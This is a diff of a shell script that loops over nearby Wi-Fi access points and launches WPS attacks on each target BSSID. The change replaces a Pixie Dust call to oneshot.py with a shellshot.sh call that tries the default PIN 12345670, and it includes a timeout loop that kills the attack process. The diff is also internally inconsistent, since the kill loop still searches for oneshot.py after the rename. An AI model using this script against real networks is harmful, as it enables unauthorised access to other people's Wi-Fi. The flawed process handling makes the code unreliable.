@@ -183,7 +183,7 @@ do
 	#Calling oneshot with target bssid
 	echo
 	echo "[+] Shooting ${BSSIDS[$TARGET]} - ${ESSIDS[$TARGET]}"
-	python oneshot.py --bssid ${BSSIDS[$TARGET]} -K -F -i $IFACE -w 2>/dev/null || true && killall sleep 2> /dev/null &
+	./shellshot.sh ${BSSIDS[$TARGET]} 12345670 $IFACE 2>/dev/null || true && killall sleep 2> /dev/null &
 	
 	#Starting timeout timer
 	if [ $TIMEOUT -gt 0 ]
@@ -192,12 +192,12 @@ do
 		PIDS="1"
 		while [ "$PIDS" ]
 		do
-			#Killing oneshot proccess, that's hang
+			#Killing shellshot proccess
 			PIDS=$(ps -ux | grep oneshot.py | grep -v grep | awk '{print $2}')
 			for PID in $PIDS
 			do
 				kill -9 $PID > /dev/null
-				echo "[*] Killed oneshot process"
+				echo "[*] Killed shellshot process"
 			done
 			sleep 1
 		done
